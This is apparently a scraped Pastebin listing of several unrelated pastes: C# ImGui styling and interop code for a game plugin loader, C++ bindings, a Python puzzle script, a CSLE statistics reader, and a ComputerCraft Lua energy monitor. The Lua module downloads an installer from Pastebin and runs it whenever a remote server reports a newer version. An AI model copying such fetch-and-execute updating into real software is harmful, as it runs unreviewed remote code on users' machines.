			style.WindowMinSize = new Vector2(20.0f, 20.0f);
			style.WindowTitleAlign = new Vector2(0.5f, 0.5f);
			style.WindowMenuButtonPosition = ImGuiDir.None;
			style.ChildRounding = 0.0f;
			style.ChildBorderSize = 1.0f;
			style.PopupRounding = 0.0f;
			style.PopupBorderSize = 1.0f;
			style.FramePadding = new Vector2(6.0f, 6.0f);
			style.FrameRounding = 1.0f;
			style.FrameBorderSize = 0.0f;
			style.ItemSpacing = new Vector2(12.0f, 6.0f);
			style.ItemInnerSpacing = new Vector2(6.0f, 3.0f);
			style.CellPadding = new Vector2(12.0f, 6.0f);
			style.IndentSpacing = 20.0f;
			style.ColumnsMinSpacing = 6.0f;
			style.ScrollbarSize = 12.0f;
			style.ScrollbarRounding = 0.0f;
			style.GrabMinSize = 12.0f;
			style.GrabRounding = 1.0f;
			style.TabRounding = 0.0f;
			style.TabBorderSize = 0.0f;
			style.TabMinWidthForCloseButton = 0.0f;
			style.ColorButtonPosition = ImGuiDir.Right;
			style.ButtonTextAlign = new Vector2(0.5f, 0.5f);
			style.SelectableTextAlign = new Vector2(0.0f, 0.0f);

			style.Colors[(int)ImGuiCol.Text] = new Vector4(1.0f, 1.0f, 1.0f, 1.0f);
			style.Colors[(int)ImGuiCol.TextDisabled] = new Vector4(0.2745098173618317f, 0.3176470696926117f, 0.4509803950786591f, 1.0f);
			style.Colors[(int)ImGuiCol.WindowBg] = new Vector4(0.0784313753247261f, 0.08627451211214066f, 0.1019607856869698f, 1.0f);
			style.Colors[(int)ImGuiCol.ChildBg] = new Vector4(0.0784313753247261f, 0.08627451211214066f, 0.1019607856869698f, 1.0f);
			style.Colors[(int)ImGuiCol.PopupBg] = new Vector4(0.0784313753247261f, 0.08627451211214066f, 0.1019607856869698f, 1.0f);
			style.Colors[(int)ImGuiCol.Border] = new Vector4(0.1568627506494522f, 0.168627455830574f, 0.1921568661928177f, 1.0f);
			style.Colors[(int)ImGuiCol.BorderShadow] = new Vector4(0.0784313753247261f, 0.08627451211214066f, 0.1019607856869698f, 1.0f);
			style.Colors[(int)ImGuiCol.FrameBg] = new Vector4(0.1176470592617989f, 0.1333333402872086f, 0.1490196138620377f, 1.0f);
			style.Colors[(int)ImGuiCol.FrameBgHovered] = new Vector4(0.1568627506494522f, 0.168627455830574f, 0.1921568661928177f, 1.0f);
			style.Colors[(int)ImGuiCol.FrameBgActive] = new Vector4(0.2352941185235977f, 0.2156862765550613f, 0.5960784554481506f, 1.0f);
			style.Colors[(int)ImGuiCol.TitleBg] = new Vector4(0.0470588244497776f, 0.05490196123719215f, 0.07058823853731155f, 1.0f);
			style.Colors[(int)ImGuiCol.TitleBgActive] = new Vector4(0.0470588244497776f, 0.05490196123719215f, 0.07058823853731155f, 1.0f);
			style.Colors[(int)ImGuiCol.TitleBgCollapsed] = new Vector4(0.0784313753247261f, 0.08627451211214066f, 0.1019607856869698f, 1.0f);
			style.Colors[(int)ImGuiCol.MenuBarBg] = new Vector4(0.09803921729326248f, 0.105882354080677f, 0.1215686276555061f, 1.0f);
			style.Colors[(int)ImGuiCol.ScrollbarBg] = new Vector4(0.0470588244497776f, 0.05490196123719215f, 0.07058823853731155f, 1.0f);
			style.Colors[(int)ImGuiCol.ScrollbarGrab] = new Vector4(0.1176470592617989f, 0.1333333402872086f, 0.1490196138620377f, 1.0f);
			style.Colors[(int)ImGuiCol.ScrollbarGrabHovered] = new Vector4(0.1568627506494522f, 0.168627455830574f, 0.1921568661928177f, 1.0f);
			style.Colors[(int)ImGuiCol.ScrollbarGrabActive] = new Vector4(0.1176470592617989f, 0.1333333402872086f, 0.1490196138620377f, 1.0f);
			style.Colors[(int)ImGuiCol.CheckMark] = new Vector4(0.4980392158031464f, 0.5137255191802979f, 1.0f, 1.0f);
			style.Colors[(int)ImGuiCol.SliderGrab] = new Vector4(0.4980392158031464f, 0.5137255191802979f, 1.0f, 1.0f);
			style.Colors[(int)ImGuiCol.SliderGrabActive] = new Vector4(0.5372549295425415f, 0.5529412031173706f, 1.0f, 1.0f);
			style.Colors[(int)ImGuiCol.Button] = new Vector4(0.257f, 0.267f, 0.554f, 1.0f);
			style.Colors[(int)ImGuiCol.ButtonHovered] = new Vector4(0.196078434586525f, 0.1764705926179886f, 0.5450980663299561f, 1.0f);
			style.Colors[(int)ImGuiCol.ButtonActive] = new Vector4(0.2352941185235977f, 0.2156862765550613f, 0.5960784554481506f, 1.0f);
			style.Colors[(int)ImGuiCol.Header] = new Vector4(0.1176470592617989f, 0.1333333402872086f, 0.1490196138620377f, 1.0f);
			style.Colors[(int)ImGuiCol.HeaderHovered] = new Vector4(0.196078434586525f, 0.1764705926179886f, 0.5450980663299561f, 1.0f);
			style.Colors[(int)ImGuiCol.HeaderActive] = new Vector4(0.2352941185235977f, 0.2156862765550613f, 0.5960784554481506f, 1.0f);
			style.Colors[(int)ImGuiCol.Separator] = new Vector4(0.1568627506494522f, 0.1843137294054031f, 0.250980406999588f, 1.0f);
			style.Colors[(int)ImGuiCol.SeparatorHovered] = new Vector4(0.1568627506494522f, 0.1843137294054031f, 0.250980406999588f, 1.0f);
			style.Colors[(int)ImGuiCol.SeparatorActive] = new Vector4(0.1568627506494522f, 0.1843137294054031f, 0.250980406999588f, 1.0f);
			style.Colors[(int)ImGuiCol.ResizeGrip] = new Vector4(0.1176470592617989f, 0.1333333402872086f, 0.1490196138620377f, 1.0f);
			style.Colors[(int)ImGuiCol.ResizeGripHovered] = new Vector4(0.196078434586525f, 0.1764705926179886f, 0.5450980663299561f, 1.0f);
			style.Colors[(int)ImGuiCol.ResizeGripActive] = new Vector4(0.2352941185235977f, 0.2156862765550613f, 0.5960784554481506f, 1.0f);
			style.Colors[(int)ImGuiCol.Tab] = new Vector4(0.0470588244497776f, 0.05490196123719215f, 0.07058823853731155f, 1.0f);
			style.Colors[(int)ImGuiCol.TabHovered] = new Vector4(0.1176470592617989f, 0.1333333402872086f, 0.1490196138620377f, 1.0f);
			style.Colors[(int)ImGuiCol.TabActive] = new Vector4(0.09803921729326248f, 0.105882354080677f, 0.1215686276555061f, 1.0f);
			style.Colors[(int)ImGuiCol.TabUnfocused] = new Vector4(0.0470588244497776f, 0.05490196123719215f, 0.07058823853731155f, 1.0f);
			style.Colors[(int)ImGuiCol.TabUnfocusedActive] = new Vector4(0.0784313753247261f, 0.08627451211214066f, 0.1019607856869698f, 1.0f);
			style.Colors[(int)ImGuiCol.PlotLines] = new Vector4(0.5215686559677124f, 0.6000000238418579f, 0.7019608020782471f, 1.0f);
			style.Colors[(int)ImGuiCol.PlotLinesHovered] = new Vector4(0.03921568766236305f, 0.9803921580314636f, 0.9803921580314636f, 1.0f);
			style.Colors[(int)ImGuiCol.PlotHistogram] = new Vector4(1.0f, 0.2901960909366608f, 0.5960784554481506f, 1.0f);
			style.Colors[(int)ImGuiCol.PlotHistogramHovered] = new Vector4(0.9960784316062927f, 0.4745098054409027f, 0.6980392336845398f, 1.0f);
			style.Colors[(int)ImGuiCol.TableHeaderBg] = new Vector4(0.0470588244497776f, 0.05490196123719215f, 0.07058823853731155f, 1.0f);
			style.Colors[(int)ImGuiCol.TableBorderStrong] = new Vector4(0.0470588244497776f, 0.05490196123719215f, 0.07058823853731155f, 1.0f);
			style.Colors[(int)ImGuiCol.TableBorderLight] = new Vector4(0.0f, 0.0f, 0.0f, 1.0f);
			style.Colors[(int)ImGuiCol.TableRowBg] = new Vector4(0.1176470592617989f, 0.1333333402872086f, 0.1490196138620377f, 1.0f);
			style.Colors[(int)ImGuiCol.TableRowBgAlt] = new Vector4(0.09803921729326248f, 0.105882354080677f, 0.1215686276555061f, 1.0f);
			style.Colors[(int)ImGuiCol.TextSelectedBg] = new Vector4(0.2352941185235977f, 0.2156862765550613f, 0.5960784554481506f, 1.0f);
			style.Colors[(int)ImGuiCol.DragDropTarget] = new Vector4(0.4980392158031464f, 0.5137255191802979f, 1.0f, 1.0f);
			style.Colors[(int)ImGuiCol.NavHighlight] = new Vector4(0.4980392158031464f, 0.5137255191802979f, 1.0f, 1.0f);
			style.Colors[(int)ImGuiCol.NavWindowingHighlight] = new Vector4(0.4980392158031464f, 0.5137255191802979f, 1.0f, 1.0f);
			style.Colors[(int)ImGuiCol.NavWindowingDimBg] = new Vector4(0.196078434586525f, 0.1764705926179886f, 0.5450980663299561f, 0.501960813999176f);
			style.Colors[(int)ImGuiCol.ModalWindowDimBg] = new Vector4(0.196078434586525f, 0.1764705926179886f, 0.5450980663299561f, 0.501960813999176f);
		}

		private static nint GetCursorPositionHook(nint app, out Point pos)
		{
			var result = _getCursorPositionHook.Original(app, out pos);
			_mousePos = new Vector2(pos.X, pos.Y);
			if (ImGui.GetCurrentContext() == 0)
				return result;

			if (ImGui.GetIO().MouseDrawCursor)
			{
				pos.X = 0;
				pos.Y = 0;
			}

			return result;
		}

		private delegate nint GetCursorPositionDelegate(nint app, out Point pos);
		private delegate void MouseUpdateDelegate(nint sMhMouse);
		private static Hook<GetCursorPositionDelegate> _getCursorPositionHook = null!;
		private static Hook<MouseUpdateDelegate> _mouseUpdateHook = null!;
		private static bool _showMenu = false;
		private static bool _showDemo = false;
		private static RenderingOptionPointers _renderingOptionPointers;
		private static Vector2 _viewportSize;
		private static Vector2 _windowSize;
		private static Vector2 _mousePos;
		private static Vector2 _mousePosScalingFactor;
		private static float _fontScale = 1.0f;
		private static Key _menuKey = DefaultMenuKey;
		private static Key _demoKey = DefaultDemoKey;

		private const Key DefaultMenuKey = Key.F9;
		private const Key DefaultDemoKey = Key.F10;
	}

	[StructLayout(LayoutKind.Sequential)]
	internal unsafe struct RenderingOptionPointers
	{
		public float* LineThickness;
		public bool* DrawPrimitivesAsWireframe;
	}
}"
RhDA2pXf,Untitled,GreenComfyTea,C#,Wednesday 27th of March 2024 04:50:01 AM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading.Tasks;
using ImGuiNET;

namespace SharpPluginLoader.Core.Rendering
{
	public static class ImGuiExtensions
	{
		public static void CreateDeviceObjectsDX11() => InternalCalls.CreateDeviceObjectsDX11();
		public static void CreateDeviceObjectsDX12() => InternalCalls.CreateDeviceObjectsDX12();

		public static bool BeginTimeline(string label, float startFrame, float endFrame, ref float currentFrame, ImGuiTimelineFlags flags = 0)
		{
			return InternalCalls.BeginTimeline(label, startFrame, endFrame, ref currentFrame, (int)flags);
		}

		public static void EndTimeline() => InternalCalls.EndTimeline();

		public static bool BeginTimelineGroup(string label, ref bool expanded)
		{
			return InternalCalls.BeginTimelineGroup(label, ref expanded);
		}

		public static bool BeginTimelineGroup(string label)
		{
			var expanded = true;
			return InternalCalls.BeginTimelineGroup(label, ref expanded);
		}

		public static void EndTimelineGroup() => InternalCalls.EndTimelineGroup();

		public static bool TimelineTrack(string label, Span<float> keyframes, out int selectedKeyframe, int explicitCount = -1)
		{
			return InternalCalls.TimelineTrack(label, keyframes, out selectedKeyframe, explicitCount);
		}

		public static bool TimelineTrack(string label, Span<float> keyframes, int explicitCount = -1)
		{
			return InternalCalls.TimelineTrack(label, keyframes, out _, explicitCount);
		}

		public static bool Bitfield(string label, ref uint value, ref int hoveredBit)
		{
			return InternalCalls.Bitfield(label, ref value, ref hoveredBit);
		}

		public static void NotificationSuccess(string message, int duration = 3000)
		{
			InternalCalls.NotificationSuccess(message, duration);
		}

		public static void NotificationError(string message, int duration = 3000)
		{
			InternalCalls.NotificationError(message, duration);
		}

		public static void NotificationWarning(string message, int duration = 3000)
		{
			InternalCalls.NotificationWarning(message, duration);
		}

		public static void NotificationInfo(string message, int duration = 3000)
		{
			InternalCalls.NotificationInfo(message, duration);
		}

		public static void Notification(ImGuiToastType type, string title, string message, int duration = 3000)
		{
			InternalCalls.Notification((int)type, duration, title, message);
		}

		public static unsafe bool InputScalar(string label, ref sbyte value, sbyte step = 1, sbyte stepFast = 10,
			string format = ""%d"", ImGuiInputTextFlags flags = 0)
		{
			return ImGui.InputScalar(
				label,
				ImGuiDataType.S8,
				(nint)Unsafe.AsPointer(ref value),
				(nint)Unsafe.AsPointer(ref step),
				(nint)Unsafe.AsPointer(ref stepFast),
				format,
				flags
			);
		}

		public static unsafe bool InputScalar(string label, ref byte value, byte step = 1, byte stepFast = 10,
			string format = ""%u"", ImGuiInputTextFlags flags = 0)
		{
			return ImGui.InputScalar(
				label,
				ImGuiDataType.U8,
				(nint)Unsafe.AsPointer(ref value),
				(nint)Unsafe.AsPointer(ref step),
				(nint)Unsafe.AsPointer(ref stepFast),
				format,
				flags
			);
		}

		public static unsafe bool InputScalar(string label, ref short value, short step = 1, short stepFast = 10,
			string format = ""%d"", ImGuiInputTextFlags flags = 0)
		{
			return ImGui.InputScalar(
				label,
				ImGuiDataType.S16,
				(nint)Unsafe.AsPointer(ref value),
				(nint)Unsafe.AsPointer(ref step),
				(nint)Unsafe.AsPointer(ref stepFast),
				format,
				flags
			);
		}

		public static unsafe bool InputScalar(string label, ref ushort value, ushort step = 1, ushort stepFast = 10,
			string format = ""%u"", ImGuiInputTextFlags flags = 0)
		{
			return ImGui.InputScalar(
				label,
				ImGuiDataType.U16,
				(nint)Unsafe.AsPointer(ref value),
				(nint)Unsafe.AsPointer(ref step),
				(nint)Unsafe.AsPointer(ref stepFast),
				format,
				flags
			);
		}

		public static unsafe bool InputScalar(string label, ref int value, int step = 1, int stepFast = 10,
			string format = ""%d"", ImGuiInputTextFlags flags = 0)
		{
			return ImGui.InputScalar(
				label,
				ImGuiDataType.S32,
				(nint)Unsafe.AsPointer(ref value),
				(nint)Unsafe.AsPointer(ref step),
				(nint)Unsafe.AsPointer(ref stepFast),
				format,
				flags
			);
		}

		public static unsafe bool InputScalar(string label, ref uint value, uint step = 1, uint stepFast = 10,
			string format = ""%u"", ImGuiInputTextFlags flags = 0)
		{
			return ImGui.InputScalar(
				label,
				ImGuiDataType.U32,
				(nint)Unsafe.AsPointer(ref value),
				(nint)Unsafe.AsPointer(ref step),
				(nint)Unsafe.AsPointer(ref stepFast),
				format,
				flags
			);
		}

		public static unsafe bool InputScalar(string label, ref long value, long step = 1, long stepFast = 10,
			string format = ""%d"", ImGuiInputTextFlags flags = 0)
		{
			return ImGui.InputScalar(
				label,
				ImGuiDataType.S64,
				(nint)Unsafe.AsPointer(ref value),
				(nint)Unsafe.AsPointer(ref step),
				(nint)Unsafe.AsPointer(ref stepFast),
				format,
				flags
			);
		}
	}

	[Flags]
	public enum ImGuiTimelineFlags
	{
		None = 0,
		EnableFramePointerSnapping = 1 << 0,
		EnableKeyframeSnapping = 1 << 1,
		ExtendFramePointer = 1 << 2,
		ExtendFrameMarkers = 1 << 3,
		ShowSelectedKeyframeMarkers = 1 << 4,

		EnableSnapping = EnableFramePointerSnapping | EnableKeyframeSnapping,
		ExtendMarkers = ExtendFramePointer | ExtendFrameMarkers | ShowSelectedKeyframeMarkers
	}

	public enum ImGuiToastType
	{
		Success,
		Warning,
		Error,
		Info
	}
}"
ffRVfa8A,Untitled,GreenComfyTea,C#,Wednesday 27th of March 2024 04:48:25 AM CDT,"
using SharpPluginLoader.Core.Resources;
using SharpPluginLoader.Core.Resources.Animation;

namespace SharpPluginLoader.Core
{
	internal static unsafe class InternalCalls
	{
#pragma warning disable CS0649 // Field is never assigned to, and will always have its default value
		public static delegate* unmanaged<nint, void> QueueYesNoDialogPtr;

		public static delegate* unmanaged<string, void> LoadChunkPtr;
		public static delegate* unmanaged<string, nint> RequestChunkPtr;
		public static delegate* unmanaged<nint> GetDefaultChunkPtr;
		public static delegate* unmanaged<nint, string, nint> ChunkGetFilePtr;
		public static delegate* unmanaged<nint, string, nint> ChunkGetFolderPtr;
		public static delegate* unmanaged<nint, nint> FileGetContentsPtr;
		public static delegate* unmanaged<nint, long> FileGetSizePtr;

		public static delegate* unmanaged<void> CreateDeviceObjectsDX11Ptr;
		public static delegate* unmanaged<void> CreateDeviceObjectsDX12Ptr;

		public static delegate* unmanaged<string, float, float, ref float, int, bool> BeginTimelinePtr;
		public static delegate* unmanaged<void> EndTimelinePtr;
		public static delegate* unmanaged<string, ref bool, bool> BeginTimelineGroupPtr;
		public static delegate* unmanaged<void> EndTimelineGroupPtr;
		public static delegate* unmanaged<string, float*, int, out int, bool> TimelineTrackPtr;

		public static delegate* unmanaged<string, ref uint, ref int, bool> BitfieldPtr;

		public static delegate* unmanaged<string, int, void> NotificationSuccessPtr;
		public static delegate* unmanaged<string, int, void> NotificationErrorPtr;
		public static delegate* unmanaged<string, int, void> NotificationWarningPtr;
		public static delegate* unmanaged<string, int, void> NotificationInfoPtr;
		public static delegate* unmanaged<int, int, string, string, void> NotificationPtr;
		public static delegate* unmanaged<void> RenderNotificationsPtr;

		public static delegate* unmanaged<nint, nint, void> RenderSpherePtr;
		public static delegate* unmanaged<nint, nint, void> RenderObbPtr;
		public static delegate* unmanaged<nint, nint, void> RenderCapsulePtr;
		public static delegate* unmanaged<nint, nint, void> RenderLinePtr;

		public static delegate* unmanaged<string, out uint, out uint, nint> LoadTexturePtr;
		public static delegate* unmanaged<nint, void> UnloadTexturePtr;
		public static delegate* unmanaged<nint, nint> RegisterTexturePtr;

		public static delegate* unmanaged<string, nint> GetRepositoryAddressPtr;
		public static delegate* unmanaged<sbyte*> GetGameRevisionPtr;
#pragma warning restore CS0649

		public static void QueueYesNoDialog(nint messagePtr) => QueueYesNoDialogPtr(messagePtr);

		public static void LoadChunk(string name) => LoadChunkPtr(name);
		public static nint GetDefaultChunk() => GetDefaultChunkPtr();
		public static nint RequestChunk(string name) => RequestChunkPtr(name);
		public static nint ChunkGetFile(nint chunk, string name) => ChunkGetFilePtr(chunk, name);
		public static nint ChunkGetFolder(nint chunk, string name) => ChunkGetFolderPtr(chunk, name);
		public static nint FileGetContents(nint file) => FileGetContentsPtr(file);
		public static long FileGetSize(nint file) => FileGetSizePtr(file);

		public static void CreateDeviceObjectsDX11() => CreateDeviceObjectsDX11Ptr();
		public static void CreateDeviceObjectsDX12() => CreateDeviceObjectsDX12Ptr();

		public static bool BeginTimeline(string label, float startFrame, float endFrame, ref float currentFrame, int flags)
		{
			return BeginTimelinePtr(label, startFrame, endFrame, ref currentFrame, flags);
		}

		public static void EndTimeline() => EndTimelinePtr();

		public static bool BeginTimelineGroup(string label, ref bool expanded)
		{
			return BeginTimelineGroupPtr(label, ref expanded);
		}

		public static void EndTimelineGroup() => EndTimelineGroupPtr();

		public static bool TimelineTrack(string label, float* keyFrames, int keyframeCount, out int selectedKeyframe)
		{
			return TimelineTrackPtr(label, keyFrames, keyframeCount, out selectedKeyframe);
		}

		public static bool TimelineTrack(string label, float[] keyFrames, out int selectedKeyframe, int explicitCount = -1)
		{
			fixed (float* ptr = keyFrames)
			{
				return TimelineTrack(label, ptr, explicitCount == -1 ? keyFrames.Length : explicitCount, out selectedKeyframe);
			}
		}

		public static bool TimelineTrack(string label, Span<float> keyFrames, out int selectedKeyframe, int explicitCount = -1)
		{
			fixed (float* ptr = keyFrames)
			{
				return TimelineTrack(label, ptr, explicitCount == -1 ? keyFrames.Length : explicitCount, out selectedKeyframe);
			}
		}

		public static bool Bitfield(string label, ref uint value, ref int hoveredBit) => BitfieldPtr(label, ref value, ref hoveredBit);

		public static void NotificationSuccess(string message, int duration) => NotificationSuccessPtr(message, duration);

		public static void NotificationError(string message, int duration) => NotificationErrorPtr(message, duration);

		public static void NotificationWarning(string message, int duration) => NotificationWarningPtr(message, duration);

		public static void NotificationInfo(string message, int duration) => NotificationInfoPtr(message, duration);

		public static void Notification(int type, int duration, string title, string message) => NotificationPtr(type, duration, title, message);

		public static void RenderNotifications() => RenderNotificationsPtr();

		public static void RenderSphere(nint spherePtr, nint colorPtr) => RenderSpherePtr(spherePtr, colorPtr);

		public static void RenderObb(nint obbPtr, nint colorPtr) => RenderObbPtr(obbPtr, colorPtr);

		public static void RenderCapsule(nint capsulePtr, nint colorPtr) => RenderCapsulePtr(capsulePtr, colorPtr);

		public static void RenderLine(nint linePtr, nint colorPtr) => RenderLinePtr(linePtr, colorPtr);

		public static nint LoadTexture(string path, out uint w, out uint h) => LoadTexturePtr(path, out w, out h);

		public static void UnloadTexture(nint texture) => UnloadTexturePtr(texture);

		public static nint RegisterTexture(nint texture) => RegisterTexturePtr(texture);

		public static nint GetRepositoryAddress(string name) => GetRepositoryAddressPtr(name);

		public static string GetGameRevision()
		{
			var revision = GetGameRevisionPtr();
			return revision == null ? string.Empty : new string(revision);
		}
	}
}"
yLhxJ9uP,Untitled,GreenComfyTea,C++,Wednesday 27th of March 2024 04:46:41 AM CDT,"#include ""ImGuiModule.h""
#include ""SharpPluginLoader.h""
#include ""Timeline.h""
#include ""Bitfield.h""

#include ""imgui_impl_dx11.h""
#include ""imgui_impl_dx12.h""
#include <imgui_notify.h>

#include ""Log.h""

#include ""CoreClr.h""

void ImGuiModule::initialize(CoreClr* coreclr) {
    coreclr->add_internal_call(""CreateDeviceObjectsDX11"", &ImGuiModule::create_device_objects_dx11);
    coreclr->add_internal_call(""CreateDeviceObjectsDX12"", &ImGuiModule::create_device_objects_dx12);

    coreclr->add_internal_call(""BeginTimeline"", &ImGuiModule::begin_timeline);
    coreclr->add_internal_call(""EndTimeline"", &ImGuiModule::end_timeline);
    coreclr->add_internal_call(""BeginTimelineGroup"", &ImGuiModule::begin_timeline_group);
    coreclr->add_internal_call(""EndTimelineGroup"", &ImGuiModule::end_timeline_group);
    coreclr->add_internal_call(""TimelineTrack"", &ImGuiModule::timeline_track);

    coreclr->add_internal_call(""Bitfield"", &ImGui::Bitfield);

    coreclr->add_internal_call(""NotificationSuccess"", &ImGuiModule::notification_success);
    coreclr->add_internal_call(""NotificationError"", &ImGuiModule::notification_error);
    coreclr->add_internal_call(""NotificationWarning"", &ImGuiModule::notification_warning);
    coreclr->add_internal_call(""NotificationInfo"", &ImGuiModule::notification_info);
    coreclr->add_internal_call(""Notification"", &ImGuiModule::notification);
    coreclr->add_internal_call(""RenderNotifications"", &ImGui::RenderNotifications);
}

void ImGuiModule::create_device_objects_dx11() {
    ImGui_ImplDX11_CreateDeviceObjects();
}

void ImGuiModule::create_device_objects_dx12() {
    ImGui_ImplDX12_CreateDeviceObjects();
}

void ImGuiModule::shutdown() {
}

bool ImGuiModule::begin_timeline(const char* label, float start_frame, float end_frame, float* p_current_frame, ImGuiTimelineFlags flags) {
    return ImGui::BeginTimeline(label, start_frame, end_frame, p_current_frame, flags);
}

void ImGuiModule::end_timeline() {
    ImGui::EndTimeline();
}

bool ImGuiModule::begin_timeline_group(const char* label, bool* open) {
    return ImGui::BeginTimelineGroup(label, open);
}

void ImGuiModule::end_timeline_group() {
    ImGui::EndTimelineGroup();
}

bool ImGuiModule::timeline_track(const char* label, float* keyframes, int keyframe_count, int* out_selected_keyframe) {
    return ImGui::TimelineTrack(label, keyframes, keyframe_count, 0, out_selected_keyframe);
}

void ImGuiModule::notification_success(const char* text, int display_time) {
    ImGui::InsertNotification({ ImGuiToastType_Success, display_time, text });
}

void ImGuiModule::notification_error(const char* text, int display_time) {
    ImGui::InsertNotification({ ImGuiToastType_Error, display_time, text });
}

void ImGuiModule::notification_warning(const char* text, int display_time) {
    ImGui::InsertNotification({ ImGuiToastType_Warning, display_time, text });
}

void ImGuiModule::notification_info(const char* text, int display_time) {
    ImGui::InsertNotification({ ImGuiToastType_Info, display_time, text });
}

void ImGuiModule::notification(int type, int duration, const char* title, const char* text) {
    ImGuiToast toast(type, duration);
    toast.set_title(title);
    toast.set_content(text);
    ImGui::InsertNotification(toast);
}"
E7Tg3L0K,Untitled,GreenComfyTea,C++,Wednesday 27th of March 2024 04:45:42 AM CDT,"#pragma once
#include ""NativeModule.h""
#include ""Timeline.h""

#include <d3d11.h>
#include <d3d12.h>
#include <dxgi.h>
#include <IconsFontAwesome6.h>

#include <imgui_impl.h>

struct MOTION_INFO;

class ImGuiModule final : public NativeModule {
public:
    void initialize(CoreClr* coreclr) override;
    void shutdown() override;

private:
    static void create_device_objects_dx11();
    static void create_device_objects_dx12();

    static bool begin_timeline(const char* label, float start_frame, float end_frame, float* p_current_frame, ImGuiTimelineFlags flags);
    static void end_timeline();

    static bool begin_timeline_group(const char* label, bool* open);
    static void end_timeline_group();

    static bool timeline_track(const char* label, float* keyframes, int keyframe_count, int* out_selected_keyframe);

    static void notification_success(const char* text, int display_time);
    static void notification_error(const char* text, int display_time);
    static void notification_warning(const char* text, int display_time);
    static void notification_info(const char* text, int display_time);

    static void notification(int type, int duration, const char* title, const char* text);
};"
3xFGYpmi,Review INGOT Brokers,reviewbrokers,PHP,Wednesday 27th of March 2024 04:44:17 AM CDT,https://www.reviewbrokers.net/review-ingot-brokers/
EDbMHqe0,Review INGOT Brokers,fxvnpro,PHP,Wednesday 27th of March 2024 04:44:13 AM CDT,https://www.fxvnpro.com/review-ingot-brokers/
hTGqpkRs,Untitled,Farz0l1x,Python,Wednesday 27th of March 2024 04:42:20 AM CDT,"file = open('9.txt')
s = file.readline()
s = s.replace('B', 'A').replace('2', '1')
s = s.replace('11A', '*')
for i in range(len(s)):
    if s[i] != '*':
        s = s.replace(s[i], ' ')
s = s.split()
print(len(max(s, key = len)))"
JPdJU3AG,CSLE statistics extraction,limmen,Python,Wednesday 27th of March 2024 03:58:52 AM CDT,"from csle_common.dao.system_identification.emulation_statistics import EmulationStatistics

if __name__ == '__main__':
    statistics = EmulationStatistics.from_json_file(""./statistics.json"")
    for condition, metric_distributions in statistics.conditionals_probs.items():
        condition_parts = condition.split('_')
        if len(condition_parts) < 3:
            continue
        attacker_action = condition_parts[0]
        defender_action = condition_parts[1]
        for metric in metric_distributions.keys():
            X = list(map(lambda x: float(x), list(metric_distributions[metric].keys())))
            Y = list(map(lambda x: float(x), list(metric_distributions[metric].values())))
            print(f""P({metric} | {attacker_action})"")
            print(f""X: {X}"")
            print(f""Y: {Y}"")

    for metric, distribution in statistics.conditionals_probs[""no_intrusion""].items():
        X = list(map(lambda x: float(x), list(distribution.keys())))
        Y = list(map(lambda x: float(x), list(distribution.values())))
        print(f""P({metric} | no intrusion)"")
        print(f""X: {X}"")
        print(f""Y: {Y}"")

"
3dKYE2zR,energy,SkyNetCloud,Lua,Wednesday 27th of March 2024 03:39:37 AM CDT,"local bat={}
local version = 2

local installer = ""P324jv87""
local token = '0'
local module_name = ''
local username = ''
local type = ''

-- write text to the terminal screen
function draw_text_term(x, y, text, text_color, bg_color)
    term.setTextColor(text_color)
    term.setBackgroundColor(bg_color)
    term.setCursorPos(x,y)
    write(text)
end

-- draw a line on the terminal screen
function draw_line_term(x, y, length, color)
    term.setBackgroundColor(color)
    term.setCursorPos(x,y)
    term.write(string.rep("" "", length))
end

function bars()
	draw_line_term(1, 1, 51, colors.lime)
	draw_line_term(1, 19, 51, colors.lime)
	draw_text_term(15, 1, 'CraftNanny Energy Module', colors.gray, colors.lime)
	draw_text_term(10, 19, 'craftnanny.org', colors.gray, colors.lime)
end

function terminal_screen()
	term.clear()
	bars()
	draw_text_term(1, 2, 'Module: ', colors.lime, colors.black)
	draw_text_term(10, 2, module_name, colors.white, colors.black)
	draw_text_term(1, 3, 'Owner: ', colors.lime, colors.black)
	draw_text_term(8, 3, username, colors.white, colors.black)
	draw_text_term(1, 4 , string.rep(""-"", 51), colors.lime, colors.black)
end

-- retrieves token from local text file
function load_config()
    sr = fs.open(""config.txt"", ""r"")
    token = sr.readLine()
    module_name = sr.readLine()
    username = sr.readLine()
    type = sr.readLine()
    sr.close()
end

-- called for new installations and when the scanner needs to be updated
function run_installer()
    if fs.exists(""install"") then
        fs.delete(""install"")
    end
    shell.run(""pastebin get ""..installer.."" install"")
    sleep(1)
    shell.run(""install"")
end


------  Start module specific code ---------

function ping_home()
    response = http.post(""https://craftnanny.org/code/ping.php"",
        ""token=""..token..""&id=""..os.getComputerID())
    current_version = response.readAll()
 
    if tonumber(current_version) > version then
      run_installer()
    end
end

function phone_home(bat_name, energy_type, percent)
    response = http.post(""https://craftnanny.org/code/energy.php"",
        ""token=""..token..""&id=""..os.getComputerID()..""&bat_name=""..bat_name..""&energy_type=""..energy_type..""&percent=""..percent)
    --return_string = response.readAll()
end

function findSide()
    local face
    if peripheral.isPresent(""left"") then
        face=""left""
        return true, face
    elseif peripheral.isPresent(""right"") then
        face=""right""
        return true, face
    elseif peripheral.isPresent(""bottom"") then
        face=""bottom""
        return true, face
    elseif peripheral.isPresent(""top"") then
        face=""top""
        return true, face
    elseif peripheral.isPresent(""back"") then
        face=""back""
        return true,face
    else
        face=""""
        return false,face
    end
end

function round(num, idp)
    local mult = 10^(idp or 0)
    return math.floor(num * mult + 0.5) / mult
end

function getBat(t,batName)
    bt=peripheral.wrap(t)

    okFE,msg = pcall(bt.getMaxEnergy)
    okRF,msg = pcall(bt.getEnergyCapacity)
    okIM,msg = pcall(bt.getMaxEnergyStored)


    if okIM then 
        capacity=bt.getMaxEnergyStored()
        batAmount=bt.getEnergyStored()
        batContentName=""FE""
    elseif okRF then 
        capacity=bt.getEnergyCapacity()
        batAmount=bt.getEnergy()
        batContentName=""RF""
    elseif okFE then
        capacity=bt.getMaxEnergy()
        batAmount=bt.getEnergy()
        batContentName=""FE""
    else
        return false
    end

    percent=round((batAmount/capacity*100),2)

    phone_home(batName, batContentName, percent)
    print(batName,"" "",batContentName,"" :"")
    powerBar = round(((term.getSize()*percent)/100),0)
    if powerBar < 50 then
        draw_line_term(6, 7, powerBar , colors.green)
        draw_line_term(6+powerBar,7,term.getSize()-powerBar-6,colors.red)
        draw_text_term(1,7,percent.."" % "",colors.lime,colors.black)
        term.setBackgroundColor(colors.black)
    else
        draw_line_term(6, 7, powerBar -6 , colors.green)
        draw_text_term(1,7,percent.."" % "",colors.lime,colors.black)
